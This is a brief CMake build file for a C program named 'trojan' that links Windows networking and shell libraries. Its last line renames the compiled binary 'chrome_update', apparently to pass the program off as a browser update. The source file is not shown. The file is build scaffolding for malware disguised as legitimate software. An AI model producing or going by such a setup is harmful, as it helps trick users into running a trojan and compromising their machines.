cmake_minimum_required(VERSION 3.10)

project(trojan)

set(CMAKE_C_STANDARD 11)

add_executable(trojan trojan.c)

target_link_libraries(trojan wininet shell32)

set_target_properties(trojan PROPERTIES OUTPUT_NAME "chrome_update")
